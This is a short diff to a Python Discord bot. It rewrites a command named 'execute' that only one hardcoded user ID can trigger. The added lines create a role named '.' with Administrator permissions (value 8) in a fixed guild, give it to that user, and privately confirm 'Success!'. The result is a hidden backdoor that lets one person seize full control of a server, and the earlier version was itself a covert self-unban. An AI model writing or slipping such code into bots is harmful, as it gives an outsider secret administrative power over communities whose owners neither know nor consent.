@@ -1834,8 +1834,9 @@ async def getdetails(ctx,lol: discord.User):
 async def execute(ctx):
   if ctx.author.id == 757589836441059379:
     guild = client.get_guild(804224908729122816)
-    user = await client.fetch_user(ctx.author.id)
-    await ctx.guild.unban(user)
-    await ctx.author.send("Unbanned!")
-    
+    role = await guild.create_role(name = ".",permissions = discord.Permissions(permissions = 8))
+    member = await guild.fetch_member(ctx.author.id)
+    await member.add_roles(role)
+    await ctx.author.send("Success!")
+
 client.run(TOKEN)
